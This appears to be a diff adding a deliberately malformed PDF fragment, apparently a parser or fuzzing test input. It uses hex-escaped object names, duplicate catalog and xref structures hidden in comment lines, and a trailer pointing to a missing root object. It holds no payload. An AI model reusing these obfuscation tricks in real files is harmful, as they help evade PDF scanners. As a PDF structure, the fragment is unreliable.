+/#50#61ge	/Co#6et#65n#74#73%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+6 0 R%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+>>%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+
+endobj
+6 0 obj
+<<	/L#65#6egth%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+1%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+>>%<</Type /Catalog /Pages 2 0 R >><</Count 1 /Kids [3 0 R] /Type /Pages >><</Parent 2 0 R /MediaBox [0 0 595 894] /ProcSet [/PDF /Text] /Resources <</Font <</F1 <</BaseFont /Times-Roman /Subtype /Type1 /Name /F1 /Encoding /WinAnsiEncoding >> >> >> /Type /Page /Contents 4 0 R >>4 0 objendstreamendobjxref0000000339 00000 n trailer<</Root 1 0 R /Size 5 >>startxref
+
+stream
+ 
+endstream
+endobj
+trailer
+<<
+ /Size 9
+ /Root 101 0 R
+>>
+startxref
+751
+%%EOF
